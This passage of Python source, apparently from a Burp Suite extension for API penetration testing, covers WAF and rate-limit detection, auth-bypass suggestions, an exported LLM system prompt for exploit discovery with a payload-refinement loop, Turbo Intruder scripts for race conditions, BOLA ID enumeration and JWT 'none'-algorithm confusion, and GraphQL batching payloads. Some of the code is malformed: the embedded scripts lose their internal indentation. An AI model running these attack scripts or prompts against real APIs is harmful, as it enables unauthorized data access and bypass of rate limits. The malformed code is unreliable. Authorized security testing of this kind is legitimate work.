    for header_key, header_value in headers.items():
        key_lower = self._ascii_safe(header_key, lower=True)
        value_lower = self._ascii_safe(header_value, lower=True)
        if any(marker in key_lower for marker in waf_header_markers):
            signals.append("header:" + key_lower)
        if key_lower == "server" and any(
            vendor in value_lower
            for vendor in ["cloudflare", "akamai", "sucuri", "imperva", "incapsula"]
        ):
            signals.append("server:" + value_lower[:40])

    if any(
        marker in body
        for marker in [
            "request blocked",
            "access denied",
            "waf",
            "security rule",
            "forbidden by policy",
        ]
    ):
        signals.append("body:block_page")

    return {"detected": bool(signals), "signals": list(dict.fromkeys(signals))[:8]}

def _detect_rate_limit(self, entries):
    entries_list = entries if isinstance(entries, list) else [entries]
    rate_headers = {}
    status_429_count = 0
    for sample in entries_list[:20]:
        if not isinstance(sample, dict):
            continue
        status_code = int(sample.get("response_status", 0) or 0)
        if status_code == 429:
            status_429_count += 1
        headers = sample.get("response_headers", {}) or {}
        for key, value in headers.items():
            key_lower = self._ascii_safe(key, lower=True)
            if key_lower in [
                "x-ratelimit-limit",
                "x-ratelimit-remaining",
                "x-ratelimit-reset",
                "retry-after",
            ]:
                rate_headers[key_lower] = self._ascii_safe(value)[:80]
    rpm = None
    limit_val = self._ascii_safe(rate_headers.get("x-ratelimit-limit", ""))
    if re.match(r"^\d+$", limit_val):
        rpm = int(limit_val)
    return {
        "detected": bool(status_429_count > 0 or rate_headers),
        "status_429_count": status_429_count,
        "header_hints": rate_headers,
        "requests_per_minute": rpm,
    }

def _suggest_auth_bypass(self, entry, attack):
    auth_types = [self._ascii_safe(x, lower=True) for x in (entry.get("auth_detected", []) or [])]
    attack_type = self._ascii_safe((attack or {}).get("type") or "", lower=True)
    vectors = []

    if "bearer token" in auth_types:
        vectors.extend(
            [
                "remove authorization header",
                "use expired or malformed bearer token",
                "swap token subject with another user identifier",
            ]
        )
    if "session cookie" in auth_types:
        vectors.extend(
            [
                "strip session cookie",
                "replay stale session cookie",
                "tamper session identifier format",
            ]
        )
    if "none" in auth_types or not auth_types:
        vectors.append("attempt forced browsing without auth")
    if attack_type in ["bola", "auth bypass", "idor"]:
        vectors.extend(
            [
                "parameter object-id swapping",
                "cross-account identifier replay",
            ]
        )

    dedup = []
    seen = set()
    for vector in vectors:
        key = self._ascii_safe(vector, lower=True)
        if key in seen:
            continue
        seen.add(key)
        dedup.append(vector)
    return dedup[:12]

def _export_behavioral_analysis(self, data_snapshot):
    """Export endpoint behavior patterns for AI logic-flaw analysis."""
    return {
        "state_transitions": self._analyze_state_transitions(data_snapshot),
        "parameter_dependencies": self._analyze_param_dependencies(data_snapshot),
        "rate_limit_patterns": self._analyze_rate_limits(data_snapshot),
        "session_management": self._analyze_sessions(data_snapshot),
        "authorization_matrix": self._build_authz_matrix(data_snapshot),
    }

def _analyze_state_transitions(self, data_snapshot):
    transitions = {}
    for endpoint_key, entries in data_snapshot.items():
        entry = self._get_entry(entries)
        method = self._ascii_safe(entry.get("method")).upper()
        path = self._ascii_safe(
            entry.get("normalized_path") or entry.get("path") or "/",
            lower=True,
        )
        segments = self._split_path_segments(path)
        resource = segments[0] if segments else "root"
        if resource not in transitions:
            transitions[resource] = {
                "methods": set(),
                "endpoints": [],
                "write_methods": 0,
            }
        transitions[resource]["methods"].add(method)
        transitions[resource]["endpoints"].append(endpoint_key)
        if method in ["POST", "PUT", "PATCH", "DELETE"]:
            transitions[resource]["write_methods"] += 1

    result = []
    for resource, info in transitions.items():
        result.append(
            {
                "resource": resource,
                "methods": sorted(list(info["methods"])),
                "endpoint_count": len(info["endpoints"]),
                "write_method_count": info["write_methods"],
                "sample_endpoints": info["endpoints"][:8],
            }
        )
    return sorted(result, key=lambda x: x["endpoint_count"], reverse=True)[:120]

def _analyze_param_dependencies(self, data_snapshot):
    dependencies = {}
    for endpoint_key, entries in data_snapshot.items():
        entries_list = entries if isinstance(entries, list) else [entries]
        dependencies[endpoint_key] = {
            "required_params": self._identify_required_params(entries_list),
            "optional_params": self._identify_optional_params(entries_list),
            "hidden_params": self._identify_hidden_params(entries_list),
            "param_interactions": self._detect_param_interactions(entries_list),
        }
    return dependencies

def _identify_required_params(self, entries):
    entries_list = [e for e in (entries or []) if isinstance(e, dict)]
    if not entries_list:
        return []
    param_sets = []
    for sample in entries_list:
        param_sets.append(set(self._extract_param_names(sample)))
    required = set(param_sets[0]) if param_sets else set()
    for param_set in param_sets[1:]:
        required = required.intersection(param_set)
    return sorted(list(required))[:80]

def _identify_optional_params(self, entries):
    entries_list = [e for e in (entries or []) if isinstance(e, dict)]
    if not entries_list:
        return []
    param_sets = []
    for sample in entries_list:
        param_sets.append(set(self._extract_param_names(sample)))
    union_set = set()
    for param_set in param_sets:
        union_set.update(param_set)
    required = set(self._identify_required_params(entries_list))
    optional = union_set.difference(required)
    return sorted(list(optional))[:80]

def _identify_hidden_params(self, entries):
    hidden_keywords = ["admin", "debug", "internal", "test", "dev", "secret", "role", "is_admin"]
    names = set()
    entries_list = [e for e in (entries or []) if isinstance(e, dict)]
    for sample in entries_list:
        for name in self._extract_param_names(sample):
            lower = self._ascii_safe(name, lower=True)
            if any(keyword in lower for keyword in hidden_keywords):
                names.add(name)
    return sorted(list(names))[:40]

def _detect_param_interactions(self, entries):
    pair_counts = {}
    entries_list = [e for e in (entries or []) if isinstance(e, dict)]
    for sample in entries_list:
        names = sorted(list(set(self._extract_param_names(sample))))
        for i in range(len(names)):
            for j in range(i + 1, len(names)):
                pair = "{}|{}".format(names[i], names[j])
                pair_counts[pair] = pair_counts.get(pair, 0) + 1
    ranked = sorted(pair_counts.items(), key=lambda item: item[1], reverse=True)
    interactions = []
    for pair, count in ranked[:20]:
        left, right = pair.split("|", 1)
        interactions.append({"params": [left, right], "cooccurrence_count": count})
    return interactions

def _analyze_rate_limits(self, data_snapshot):
    patterns = []
    for endpoint_key, entries in data_snapshot.items():
        rate_info = self._detect_rate_limit(entries)
        if rate_info.get("detected"):
            patterns.append({"endpoint": endpoint_key, "rate_limit": rate_info})
    return patterns[:120]

def _analyze_sessions(self, data_snapshot):
    auth_counts = {}
    cookie_names = set()
    for _, entries in data_snapshot.items():
        entry = self._get_entry(entries)
        for auth_type in entry.get("auth_detected", []) or []:
            auth_key = self._ascii_safe(auth_type)
            auth_counts[auth_key] = auth_counts.get(auth_key, 0) + 1
        headers = entry.get("headers", {}) or {}
        cookie_header = self._ascii_safe(headers.get("Cookie") or headers.get("cookie") or "")
        if cookie_header:
            for part in cookie_header.split(";"):
                name = self._ascii_safe(part.split("=", 1)[0]).strip()
                if name:
                    cookie_names.add(name)
    return {
        "auth_method_counts": auth_counts,
        "cookie_names": sorted(list(cookie_names))[:80],
    }

def _build_authz_matrix(self, data_snapshot):
    matrix = []
    for endpoint_key, entries in data_snapshot.items():
        entries_list = entries if isinstance(entries, list) else [entries]
        auth_contexts = set()
        statuses = set()
        for sample in entries_list:
            if not isinstance(sample, dict):
                continue
            for auth_type in sample.get("auth_detected", []) or []:
                auth_contexts.add(self._ascii_safe(auth_type))
            status_code = sample.get("response_status", 0)
            if isinstance(status_code, int):
                statuses.add(status_code)
        matrix.append(
            {
                "endpoint": endpoint_key,
                "auth_contexts": sorted(list(auth_contexts)),
                "observed_status_codes": sorted(list(statuses)),
                "sample_count": len(entries_list),
            }
        )
    return matrix[:200]

def _create_ai_feedback_loop_export(self, test_results):
    """Export test results so AI can refine payload generation strategy."""
    results = test_results if isinstance(test_results, list) else []
    feedback = {
        "tested_payloads": [],
        "successful_attacks": [],
        "failed_attempts": [],
        "learned_patterns": {},
    }
    for result in results:
        if not isinstance(result, dict):
            continue
        vulnerable = bool(result.get("vulnerable"))
        feedback_entry = {
            "payload": result.get("payload"),
            "success": vulnerable,
            "response_analysis": {
                "status": result.get("status"),
                "body_snippet": self._ascii_safe(result.get("body", ""))[:200],
                "headers": result.get("headers", {}),
                "timing": result.get("response_time"),
            },
            "refinement_hints": self._generate_refinement_hints(result),
        }
        feedback["tested_payloads"].append(feedback_entry)
        if vulnerable:
            feedback["successful_attacks"].append(feedback_entry)
        else:
            feedback["failed_attempts"].append(feedback_entry)

    feedback["learned_patterns"] = self._extract_learned_patterns(results)
    if not results:
        feedback["instructions"] = [
            "Populate tested_payloads with real execution results.",
            "Mark vulnerable=true when exploit indicators are confirmed.",
            "Re-export this file and submit to AI for refinement.",
        ]
    return feedback

def _generate_refinement_hints(self, result):
    hints = []
    status = int(result.get("status", 0) or 0)
    body = self._ascii_safe(result.get("body", ""), lower=True)
    if status in [401, 403]:
        hints.append("focus on auth context or privilege mismatch")
    elif status in [429]:
        hints.append("throttle requests or rotate request cadence")
    elif status >= 500:
        hints.append("server-side error observed, check for injection pivot")
    if "blocked" in body or "waf" in body or "access denied" in body:
        hints.append("try encoding/header/path bypass variants")
    if not hints:
        hints.append("adjust payload syntax and parameter placement")
    return hints[:6]

def _extract_learned_patterns(self, test_results):
    results = test_results if isinstance(test_results, list) else []
    summary = {"total": len(results), "successful": 0, "by_category": {}}
    for result in results:
        if not isinstance(result, dict):
            continue
        category = self._ascii_safe(result.get("category") or result.get("type") or "unknown")
        if category not in summary["by_category"]:
            summary["by_category"][category] = {"total": 0, "successful": 0}
        summary["by_category"][category]["total"] += 1
        if bool(result.get("vulnerable")):
            summary["successful"] += 1
            summary["by_category"][category]["successful"] += 1
    return summary

def _export_for_llm_platform(self, platform, ai_input):
    """Export in format optimized for specific LLM platforms."""
    if platform == "openai":
        return self._export_openai_format(ai_input)
    if platform == "anthropic":
        return self._export_anthropic_format(ai_input)
    return self._export_ollama_format(ai_input)

def _export_openai_format(self, ai_input):
    """Format optimized for OpenAI chat/completions style consumption."""
    return {
        "model": "gpt-5.4",
        "messages": [
            {"role": "system", "content": self._generate_enhanced_ai_prompt()},
            {"role": "user", "content": json.dumps(ai_input)},
        ],
        "tools": [
            {
                "type": "function",
                "function": {
                    "name": "generate_security_payloads",
                    "description": "Generate context-aware security testing payloads",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "payloads": {"type": "array"},
                            "exploitation_chain": {"type": "array"},
                            "confidence_scores": {"type": "object"},
                        },
                    },
                },
            }
        ],
        "temperature": 0.2,
    }

def _export_anthropic_format(self, ai_input):
    return {
        "model": "claude-3-5-sonnet-latest",
        "system": self._generate_enhanced_ai_prompt(),
        "messages": [{"role": "user", "content": json.dumps(ai_input)}],
        "max_tokens": 4096,
        "temperature": 0.2,
    }

def _export_ollama_format(self, ai_input):
    return {
        "model": "llama3.1:8b-instruct",
        "prompt": "{}\n\nINPUT:\n{}".format(
            self._generate_enhanced_ai_prompt(), json.dumps(ai_input, indent=2)
        ),
        "options": {"temperature": 0.2},
    }

def _get_vuln_summary(self, attacks_snapshot):
    summary = {"total": len(attacks_snapshot), "by_type": {}, "by_severity": {}}
    for _, attack in attacks_snapshot:
        attack_obj = attack if isinstance(attack, dict) else {}
        attack_type = self._ascii_safe(attack_obj.get("type") or "Unknown")
        severity = self._calculate_attack_severity(attack_obj)
        summary["by_type"][attack_type] = summary["by_type"].get(attack_type, 0) + 1
        summary["by_severity"][severity] = summary["by_severity"].get(severity, 0) + 1
    return summary

def _extract_api_patterns(self, data_snapshot):
    counts = {}
    for _, entries in data_snapshot.items():
        entry = self._get_entry(entries)
        for pattern in entry.get("api_patterns", []) or []:
            key = self._ascii_safe(pattern)
            counts[key] = counts.get(key, 0) + 1
    ranked = sorted(counts.items(), key=lambda item: item[1], reverse=True)
    return [{"pattern": key, "count": value} for key, value in ranked[:40]]

def _extract_auth_flows(self, data_snapshot):
    counts = {}
    protected = []
    public = []
    for endpoint_key, entries in data_snapshot.items():
        entry = self._get_entry(entries)
        auth_types = entry.get("auth_detected", []) or []
        auth_lower = [self._ascii_safe(x, lower=True) for x in auth_types]
        is_public = ("none" in auth_lower) or (len(auth_lower) == 0)
        if is_public:
            public.append(endpoint_key)
        else:
            protected.append(endpoint_key)
        for auth_type in auth_types:
            key = self._ascii_safe(auth_type)
            counts[key] = counts.get(key, 0) + 1
    return {
        "auth_method_counts": counts,
        "protected_examples": protected[:30],
        "public_examples": public[:30],
    }

def _extract_business_logic(self, data_snapshot):
    hints = []
    keywords = [
        "price",
        "amount",
        "cost",
        "total",
        "quantity",
        "stock",
        "discount",
        "coupon",
        "balance",
        "wallet",
        "refund",
        "checkout",
        "payment",
        "transfer",
        "withdraw",
        "role",
        "permission",
        "admin",
        "limit",
        "quota",
    ]
    for endpoint_key, entries in data_snapshot.items():
        entry = self._get_entry(entries)
        path = self._ascii_safe(
            entry.get("normalized_path") or entry.get("path") or "/", lower=True
        )
        param_names = [self._ascii_safe(x, lower=True) for x in self._extract_param_names(entry)]
        joined = " ".join([path] + param_names)
        matched = [word for word in keywords if word in joined]
        if matched:
            hints.append(
                {
                    "endpoint": endpoint_key,
                    "keywords": matched[:8],
                    "method": self._ascii_safe(entry.get("method", "")).upper(),
                }
            )
    return hints[:120]

def _calculate_attack_severity(self, attack):
    attack_type = self._ascii_safe((attack or {}).get("type") or "", lower=True)
    if attack_type in [
        "bola",
        "idor",
        "auth bypass",
        "sql injection",
        "ssrf",
        "xxe",
        "deserialization",
    ]:
        return "Critical"
    if attack_type in [
        "xss",
        "nosql injection",
        "ssti",
        "mass assignment",
        "waf bypass",
        "jwt",
    ]:
        return "High"
    return "Medium"

def _generate_enhanced_ai_prompt(self):
    return """# Advanced API Exploit Discovery (High ROI, Low Duplicate)

## Context
You are analyzing real API capture data with vulnerability findings, response patterns, behavioral analytics, and deep-logic artifacts.
Treat this as bug-bounty triage where duplicate reports are common.

## Mission
Find exploit paths that lead to unauthorized sensitive-data access or unauthorized state changes.
Prioritize non-obvious findings with strong proof over generic low-signal issues.
The final goal is a working real-world non-destructive exploit narrative that leaves no wiggle room in severe triage.

## Priority Order
1. Sensitive-data access via authz flaws (BOLA/IDOR, cross-account reads, token scope abuse)
2. Privilege escalation chains (golden-ticket-style token reuse, role drift, cross-resource pivots)
3. State-machine/business-logic breaks (invalid transitions, lifecycle abuse, race invariants)
4. Cross-interface parity drift (REST/GraphQL/internal mismatch leading to bypass)
5. Injection/SSRF/other classes when they materially expose sensitive data

## Required Reasoning Rules
1. Correlate endpoint context, auth context, and behavioral patterns before ranking.
2. Prefer reproducible multi-step chains over single noisy probes.
3. For every finding, estimate duplicate risk and explain the novelty angle.
4. Include proof deltas (status/body/header/timing/field-level differences) that demonstrate exploitability.
5. Include false-positive guards and stop conditions.
6. Require non-destructive PoCs only (no destructive writes/deletes/irreversible actions).
7. If only destructive proof exists, mark Needs Verification and list exact missing safe validation artifacts.
8. Every confirmed claim must cite exact request/response evidence, auth context, UTC timing, and artifact references.

## Output Requirements
- Return JSON only.
- Use exact finding keys: title, severity, bug_class, confidence, duplicate_risk, why_novel, affected_endpoints, sensitive_data_target, reproduction_steps, expected_response_delta, evidence_used, remediation.
- Include `Priority Queue` ranked highest ROI to lowest ROI.
- Include `Needs Verification` with exact missing requests/responses/tokens/artifacts when evidence is insufficient.
- If truncation exists, include `Truncation Report` and request overflow artifacts.
"""

def _generate_ai_prompt(self):
    """Backward-compatible alias for older AI export consumers."""
    return self._generate_enhanced_ai_prompt()

def _export_turbo_intruder(self):
    """Export Turbo Intruder Python scripts for race conditions and high-speed attacks"""
    import os

    if not self.api_data or not self.fuzzing_attacks:
        msg = "[!] Generate fuzzing attacks first"
        self.fuzzer_area.append("\n" + msg + "\n")
        self.log_to_ui(msg)
        return

    self.fuzzer_area.append("\n" + "=" * 80 + "\n")
    self.fuzzer_area.append("[*] Exporting Turbo Intruder scripts...\n")

    export_dir = self._get_export_dir("TurboIntruder")
    if not export_dir:
        return

    # Generate scripts for different attack types
    scripts = {
        "race_condition.py": self._generate_race_script(),
        "bola_enum.py": self._generate_bola_script(),
        "jwt_brute.py": self._generate_jwt_script(),
    }

    for script_name, script_content in scripts.items():
        filename = os.path.join(export_dir, script_name)
        try:
            writer = FileWriter(filename)
            writer.write(script_content)
            writer.close()
            self.fuzzer_area.append("[+] Created: {}\n".format(script_name))
        except Exception as e:
            self.fuzzer_area.append(
                "[!] Failed: {} - {}\n".format(script_name, str(e))
            )
            self.log_to_ui("[!] Failed to write {}: {}".format(script_name, str(e)))

    self.fuzzer_area.append("[+] Exported Turbo Intruder scripts\n")
    self.fuzzer_area.append("[+] Folder: {}\n".format(export_dir))
    self.log_to_ui("[+] Exported Turbo Intruder scripts to: {}".format(export_dir))

def _generate_race_script(self):
    return """# Turbo Intruder - Race Condition Attack
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
                      concurrentConnections=50,
                      requestsPerConnection=1,
                      pipeline=False)

# Warm up connection pool
for i in range(10):
    engine.queue(target.req)

# Send parallel requests
for i in range(100):
    engine.queue(target.req, gate='race1')

# Open gate for simultaneous execution
engine.openGate('race1')

def handleResponse(req, interesting):
if req.status == 200:
    table.add(req)
"""

def _generate_bola_script(self):
    return """# Turbo Intruder - BOLA Enumeration
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
                      concurrentConnections=10,
                      requestsPerConnection=100,
                      pipeline=False)

# Enumerate IDs
for i in range(1, 10000):
    engine.queue(target.req, str(i))

# Try common usernames
for word in open('/usr/share/wordlists/usernames.txt'):
    engine.queue(target.req, word.strip())

def handleResponse(req, interesting):
if req.status == 200 and len(req.response) > 100:
    table.add(req)
"""

def _generate_jwt_script(self):
    return """# Turbo Intruder - JWT Algorithm Confusion
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
                      concurrentConnections=5,
                      requestsPerConnection=50,
                      pipeline=False)

# Algorithm confusion attacks
algs = ['none', 'None', 'NONE', 'nOnE', 'HS256', 'HS384', 'HS512']
for alg in algs:
    modified_req = target.req.replace('alg":"RS256', 'alg":"' + alg)
    engine.queue(modified_req)

# Null signature
engine.queue(target.req.replace(target.req.split('.')[-1], ''))

def handleResponse(req, interesting):
if req.status == 200:
    table.add(req)
"""

def _export_nuclei_targets(self):
    """Export Nuclei scan results - only if scan has been run"""
    current_text = self.nuclei_area.getText()
    if not current_text or "NUCLEI SCAN RESULTS" not in current_text:
        self.nuclei_area.setText("[!] No discoveries to export\n[!] Run Nuclei scan first\n")
        return
    self.nuclei_area.append("\n[!] Results displayed above\n")

def _collect_nuclei_targets(self):
    return jython_size_helpers.collect_nuclei_targets(self)

def _infer_nuclei_output_severity(self, line_text):
    """Infer severity token from plain nuclei output line."""
    safe_line = self._ascii_safe(line_text, lower=True)
    match = re.search(r"\[(critical|high|medium|low|info)\]", safe_line)
    if match:
        return match.group(1)
    return "info"

def _extract_nuclei_plain_findings(self, output_text, max_lines=300):
    """Extract finding-like lines from plain nuclei process output."""
    lines = []
    seen = set()
    text = self._ascii_safe(output_text)
    for raw in text.splitlines():
        clean = self.ANSI_ESCAPE_PATTERN.sub("", self._ascii_safe(raw)).strip()
        if not clean:
            continue
        lower = clean.lower()
        if lower.startswith("[*]") or lower.startswith("[inf]") or lower.startswith("[wrn]"):
            continue
        if "templates loaded" in lower or "targets loaded" in lower:
            continue
        if "http://" not in lower and "https://" not in lower:
            continue
        if clean in seen:
            continue
        seen.add(clean)
        lines.append(clean)
        if len(lines) >= max_lines:
            break
    return lines

def _write_nuclei_partial_results_jsonl(self, output_text, output_path):
    """Create JSONL fallback results from plain nuclei output lines."""
    findings = self._extract_nuclei_plain_findings(output_text)
    writer = None
    try:
        writer = open(output_path, "w")
        for line in findings:
            severity = self._infer_nuclei_output_severity(line)
            row = {
                "template-id": "partial-output",
                "matched-at": line,
                "info": {"severity": severity},
            }
            writer.write(json.dumps(row) + "\n")
    except Exception as e:
        self._callbacks.printError(
            "Nuclei partial JSONL synthesis failed: {}".format(str(e))
        )
        return 0
    finally:
        if writer:
            try:
                writer.close()
            except Exception as e:
                self._callbacks.printError(
                    "Nuclei partial JSONL close failed: {}".format(str(e))
                )
    return len(findings)

def _resolve_graphql_tool_path(self, field_name, candidates):
    """Resolve GraphQL stage tool path from existing tab field or fallback list."""
    import os

    if field_name and hasattr(self, field_name):
        try:
            field_obj = getattr(self, field_name)
            value = self._ascii_safe(field_obj.getText()).strip()
            if value:
                return value
        except Exception as e:
            self._callbacks.printError(
                "GraphQL tool path read error ({}): {}".format(field_name, str(e))
            )
    for candidate in (candidates or []):
        path = self._ascii_safe(candidate).strip()
        if not path:
            continue
        if os.path.exists(path):
            return path
    if candidates:
        return self._ascii_safe(candidates[-1]).strip()
    return ""

def _normalize_graphql_target_url(self, value):
    """Normalize user or history target text into an HTTP URL."""
    text = self._ascii_safe(value).strip()
    if not text:
        return ""
    if not text.startswith("http://") and not text.startswith("https://"):
        text = text.strip("/")
        if "/" not in text:
            text = "https://{}/graphql".format(text)
        else:
            text = "https://{}".format(text)
    return self._clean_url(text)

def _parse_graphql_target_values(self, text):
    """Parse GraphQL targets from comma/newline and fallback whitespace-separated text."""
    raw = self._ascii_safe(text or "")
    values = self._parse_comma_newline_values(raw)
    if len(values) > 1:
        return values

    # GraphQL targets are entered in a single-line JTextField; historical/newline
    # values can be collapsed into whitespace, so recover each token here.
    if any(ch in raw for ch in [" ", "\t"]):
        recovered = []
        seen = set()
        for token in re.split(r"[\s,]+", raw):
            value = self._ascii_safe(token).strip()
            if (not value) or (value in seen):
                continue
            seen.add(value)
            recovered.append(value)
        if len(recovered) > 1:
            return recovered
    return values

def _export_graphql_batch_queries(self):
    """Export GraphQL batch query payloads for rate-limit bypass testing."""
    import os

    generated = self._collect_graphql_raider_operations(max_count=60)

    batch_payloads = []
    if generated:
        for operation in generated[:30]:
            query = self._ascii_safe(operation.get("query") or "").strip()
            if query:
                batch_payloads.append({"query": query})

    attacks = self._get_graphql_attacks()
    for raw in attacks.get("batching", []) + attacks.get("array_batching", []):
        value = self._ascii_safe(raw).strip()
        if not value:
            continue
        batch_payloads.append({"query": value})

    deduped = []
    seen = set()
    for item in batch_payloads:
        query = self._ascii_safe(item.get("query") or "").strip()
        if (not query) or query in seen:
            continue
        seen.add(query)
        deduped.append({"query": query})

    if not deduped:
        self.graphql_area.append(
            "[!] No batch payloads to export. Enable at least one Raider family first.\n"
        )
        return

    export_dir = self._get_export_dir("GraphQL_Batch")
    if not export_dir:
        self.graphql_area.append("[!] Cannot create GraphQL batch export directory\n")
        return

    files = {
        os.path.join(export_dir, "graphql_batch_payload.json"): json.dumps(deduped, indent=2),
        os.path.join(export_dir, "graphql_queries.txt"): "\n\n".join(
            [item.get("query") for item in deduped]
        )
        + "\n",
        os.path.join(export_dir, "README.txt"): (
            "GraphQL Batch Queries Export\n"
            "===========================\n"
            "- graphql_batch_payload.json: JSON array for batching tests\n"
            "- graphql_queries.txt: one query per block\n"
            "Use these payloads in Repeater/Intruder to test batching and rate-limit controls.\n"
        ),
    }

    for path, content in files.items():
        writer = None
        try:
            writer = FileWriter(path)
            writer.write(content)
        except Exception as e:
            self._callbacks.printError(
                "GraphQL batch export failed ({}): {}".format(path, self._ascii_safe(e))
            )
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "GraphQL batch export close failed ({}): {}".format(
                            path, self._ascii_safe(e)
                        )
                    )

    self.graphql_area.append(
        "[+] Exported GraphQL batch payloads: {} entries\n[+] Folder: {}\n".format(
            len(deduped), export_dir
        )
    )
    self.log_to_ui(
        "[+] GraphQL batch export complete: {} payloads".format(len(deduped))
    )

def _graphql_profile_presets(self):
    """Return built-in GraphQL Raider profile presets."""
    return {
        "Balanced": {
            "introspection": True,
            "batching": True,
            "aliases": True,
            "depth": False,
            "mutations": False,
            "field_suggestion": True,
            "directive_overload": False,
            "circular_fragment": False,
            "request_mode": "POST JSON",
            "max_ops": 40,
        },
        "Safe Recon": {
            "introspection": True,
            "batching": False,
            "aliases": False,
            "depth": False,
            "mutations": False,
            "field_suggestion": True,
            "directive_overload": False,
            "circular_fragment": False,
            "request_mode": "GET Query",
            "max_ops": 20,
        },
        "Aggressive Raider": {
            "introspection": True,
            "batching": True,
            "aliases": True,
            "depth": True,
            "mutations": True,
            "field_suggestion": True,
            "directive_overload": True,
            "circular_fragment": True,
            "request_mode": "POST JSON",
            "max_ops": 120,
        },
    }

def _apply_graphql_profile(self, event=None, profile_name=None, log_output=True):
    """Apply selected GraphQL profile values to Raider controls."""
    if getattr(self, "_applying_graphql_profile", False):
        return self._ascii_safe(getattr(self, "graphql_active_profile", "Balanced"))
    presets = self._graphql_profile_presets()
    selected_name = self._ascii_safe(profile_name or "").strip()
    if not selected_name:
        combo = getattr(self, "graphql_profile_combo", None)
        if combo is not None and combo.getSelectedItem() is not None:
            selected_name = self._ascii_safe(str(combo.getSelectedItem())).strip()
    if selected_name not in presets:
        selected_name = "Balanced"
    preset = presets.get(selected_name, presets.get("Balanced", {}))

    self._applying_graphql_profile = True
    try:
        checkbox_map = [
            ("graphql_raider_introspection_checkbox", "introspection"),
            ("graphql_raider_batching_checkbox", "batching"),
            ("graphql_raider_alias_checkbox", "aliases"),
            ("graphql_raider_depth_checkbox", "depth"),
            ("graphql_raider_mutation_checkbox", "mutations"),
            ("graphql_raider_suggestion_checkbox", "field_suggestion"),
            ("graphql_raider_directive_checkbox", "directive_overload"),
            ("graphql_raider_fragment_checkbox", "circular_fragment"),
        ]
        for attr_name, key in checkbox_map:
            component = getattr(self, attr_name, None)
            if component is not None:
                component.setSelected(bool(preset.get(key, False)))

        mode_combo = getattr(self, "graphql_request_mode_combo", None)
        if mode_combo is not None:
            mode_combo.setSelectedItem(self._ascii_safe(preset.get("request_mode") or "POST JSON"))
        max_ops_field = getattr(self, "graphql_raider_max_ops_field", None)
        if max_ops_field is not None:
            max_ops_field.setText(str(int(preset.get("max_ops", 40) or 40)))
        profile_combo = getattr(self, "graphql_profile_combo", None)
        if profile_combo is not None:
            profile_combo.setSelectedItem(selected_name)
    finally:
        self._applying_graphql_profile = False

    with self.graphql_lock:
        self.graphql_active_profile = selected_name
    if log_output and hasattr(self, "graphql_area") and self.graphql_area is not None:
        self.graphql_area.append(
            "[*] Applied GraphQL profile: {} (mode={}, max_ops={})\n".format(
                selected_name,
                self._ascii_safe(preset.get("request_mode") or "POST JSON"),
                int(preset.get("max_ops", 40) or 40),
            )
        )
    return selected_name

def _graphql_attack_family_selection(self):
    """Read GraphQL Raider-style attack-family checkbox state."""
    return {
        "introspection": bool(
            getattr(self, "graphql_raider_introspection_checkbox", None)
            and self.graphql_raider_introspection_checkbox.isSelected()
        ),
        "batching": bool(
            getattr(self, "graphql_raider_batching_checkbox", None)
            and self.graphql_raider_batching_checkbox.isSelected()
        ),
        "aliases": bool(
            getattr(self, "graphql_raider_alias_checkbox", None)
            and self.graphql_raider_alias_checkbox.isSelected()
        ),
        "depth": bool(
            getattr(self, "graphql_raider_depth_checkbox", None)
            and self.graphql_raider_depth_checkbox.isSelected()
        ),
        "mutations": bool(
            getattr(self, "graphql_raider_mutation_checkbox", None)
            and self.graphql_raider_mutation_checkbox.isSelected()
        ),
        "field_suggestion": bool(
            getattr(self, "graphql_raider_suggestion_checkbox", None)
            and self.graphql_raider_suggestion_checkbox.isSelected()
        ),
        "directive_overload": bool(
            getattr(self, "graphql_raider_directive_checkbox", None)
            and self.graphql_raider_directive_checkbox.isSelected()
        ),
        "circular_fragment": bool(
            getattr(self, "graphql_raider_fragment_checkbox", None)
            and self.graphql_raider_fragment_checkbox.isSelected()
        ),
    }

def _collect_graphql_raider_operations(self, max_count=40):
    """Build GraphQL Raider-like operations from selected attack families."""
    max_ops = self._parse_positive_int(max_count, 40, 1, 300)
    selected = self._graphql_attack_family_selection()
    attacks = self._get_graphql_attacks()
    family_map = [
        ("introspection", "introspection"),
        ("batching", "batching"),
        ("batching", "array_batching"),
        ("aliases", "aliases"),
        ("depth", "depth"),
        ("mutations", "mutations"),
        ("field_suggestion", "field_suggestion"),
        ("directive_overload", "directive_overload"),
        ("circular_fragment", "circular_fragment"),
    ]

    operations = []
    seen_queries = set()
    for toggle_key, attack_key in family_map:
        if not selected.get(toggle_key, False):
            continue
        payloads = attacks.get(attack_key, []) or []
        idx = 0
        for payload in payloads:
            idx += 1
            query = self._ascii_safe(payload or "").strip()
            if (not query) or query in seen_queries:
                continue
            seen_queries.add(query)
            operations.append(
                {
                    "operation_type": "raider",
                    "operation_name": "raider_{}_{}".format(attack_key, idx),
                    "query": query,
                }
            )
            if len(operations) >= max_ops:
                return operations
    return operations

def _parse_graphql_custom_headers(self):
    """Parse custom GraphQL request headers from single-line or multiline text."""
    text = self._ascii_safe(
        getattr(self, "graphql_headers_field", None).getText()
        if getattr(self, "graphql_headers_field", None) is not None
        else ""
    )
    if not text.strip():
        return []
    parts = []
    for row in text.replace("\r", "\n").split("\n"):
        for item in row.split(";"):
            clean = self._ascii_safe(item).strip()
            if clean:
                parts.append(clean)
    blocked = set(["host", "content-length", "connection"])
    parsed = []
    seen = set()
    for part in parts:
        if ":" not in part:
            continue
        key, value = part.split(":", 1)
        key_clean = self._ascii_safe(key).strip()
        value_clean = self._ascii_safe(value).strip()
        key_lower = self._ascii_safe(key_clean, lower=True)
        if (not key_clean) or (not value_clean) or key_lower in blocked:
            continue
        if key_lower in seen:
            continue
        seen.add(key_lower)
        parsed.append((key_clean, value_clean))
    return parsed

def _collect_graphql_delivery_operations(self, max_count=30):
    """Resolve operations to send from Raider family selections."""
    limit = self._parse_positive_int(max_count, 30, 1, 300)
    return self._collect_graphql_raider_operations(max_count=limit)

def _graphql_build_http_request(self, target_url, operation):
    """Build HTTP request for one GraphQL operation and target URL."""
    try:
        from urllib import quote as url_quote
    except ImportError:
        from urllib.parse import quote as url_quote

    parsed = URL(self._ascii_safe(target_url))
    host = self._ascii_safe(parsed.getHost() or "").strip()
    if not host:
        return None
